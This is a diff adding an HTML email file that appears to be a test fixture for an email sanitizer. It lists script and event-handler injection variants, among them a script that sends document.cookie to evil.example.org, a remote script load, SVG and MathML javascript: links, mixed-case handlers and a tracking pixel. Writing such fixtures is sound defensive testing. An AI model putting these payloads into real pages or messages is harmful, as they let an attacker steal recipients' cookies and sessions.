@@ -1,0 +1,22 @@
+From: Attacker <x@example.org>
+To: Alice <alice@example.org>
+Subject: Scripts and handlers
+Date: Fri, 5 Sep 2026 10:02:00 +0200
+Message-ID: <scripts-events@example.org>
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><head>
+<script>document.location = 'https://evil.example.org/' + document.cookie</script>
+<script src="https://evil.example.org/x.js"></script>
+</head>
+<body onload="steal()" onpageshow="steal()">
+<p onclick="steal()" onmouseover="steal()">Click me</p>
+<a href="https://example.org/ok" onclick="steal(); return false">A link</a>
+<img src="cid:none@example.org" onerror="steal()">
+<img src="https://cdn.example.org/x.png" onload="steal()">
+<noscript><img src="https://track.example.org/noscript.gif" width="1" height="1"></noscript>
+<svg onload="steal()"><script>steal()</script><a xlink:href="javascript:steal()"><text x="0" y="15">svg link</text></a></svg>
+<math><maction actiontype="statusline#javascript:steal()"><mi>x</mi></maction></math>
+<div ONCLICK="steal()" OnMouseDown="steal()">mixed case</div>
+</body></html>
